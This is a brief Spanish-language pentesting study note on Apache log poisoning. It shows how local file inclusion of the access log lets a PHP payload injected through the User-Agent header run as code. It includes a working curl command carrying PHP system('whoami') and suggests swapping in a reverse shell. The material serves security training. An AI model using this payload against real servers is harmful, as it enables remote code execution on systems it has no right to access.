# Log poisoning Apache
Es una vulnerabilidad que afecta cuando tenemos acceso a los logs de apache y el servidor es capaz de interpretar PHP
```
/var/log/apache2/acces.log
```

De manera que teniendo Local FIle Inclusiom (para leer el log),  haciendo una petición por curl, podriamos modificar la cabecera "User-Agent" de manera que justo ahí definamos una estructura PHP para interpretar comandos y derive en un RCE.

# Local File Inclusion

Con esto, veremos el fichero de logs
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/logp1.png" /> 

# Petición http CURL
 ```
 curl -s -X GET "http://localhost" -H "User-Agent: <?php system('whoami'); ?>"
 ```
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/logp2.png" /> 
 
# Consultando el LOG
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/logp3.png" /> 

Si en lugar de esto, colamos una reverse shell, poniéndonos a la escucha, ya estaría ganado el acceso a la máquina.
